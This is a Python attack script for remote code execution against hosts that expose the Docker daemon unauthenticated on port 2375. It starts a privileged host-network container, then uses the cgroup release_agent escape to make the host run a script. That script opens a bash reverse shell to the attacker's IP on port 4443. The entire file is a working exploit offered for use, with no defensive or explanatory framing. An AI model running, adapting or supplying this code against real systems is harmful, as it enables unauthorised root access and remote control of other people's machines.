# Python script to get RCE with the use of Docker

import docker

def main():
    # Host should be the IP for the reverse connection
    host_ip = ''

    # Target should be the IP of the system you are attacking
    target_ip = ''

    try:
        # sets IP to connect to Docker Daemon
        client = docker.DockerClient(base_url='tcp://' + target_ip + ':2375')

        try:
            # create privileged ubuntu container that stays open / waits for commands
            print("Creating malicious container")
            client.containers.run(image='ubuntu', command='bash', name='ubuntu', privileged=True, remove=True, detach=True, tty=True, stdin_open=True, network_mode="host")
            print("Container created")

            # create container object
            container = client.containers.get('ubuntu')

            container.exec_run(cmd="bash -c 'mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x'")
            container.exec_run(cmd="bash -c 'echo 1 > /tmp/cgrp/x/notify_on_release'")
            container.exec_run(cmd='''bash -c "host_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab` && echo "$host_path/cmd" > /tmp/cgrp/release_agent"''')
            container.exec_run(cmd='''bash -c "touch /cmd && echo '#!/bin/bash' >> /cmd"''')
            container.exec_run(cmd="""bash -c 'echo "bash -i >& /dev/tcp/""" + host_ip + """/4443 0>&1" >> /cmd'""")
            container.exec_run(cmd='chmod a+x /cmd')
            container.exec_run(cmd="""bash -c 'sh -c "echo \\$\\$ > /tmp/cgrp/x/cgroup.procs"'""")

            print('All commands sent.')
        except:
            print('Container already running on target.')
    except docker.errors.DockerException:
        print('Could not connect to target IP. Ensure the target has the docker socket enabled on port 2375.')

if __name__ == "__main__":
    main()
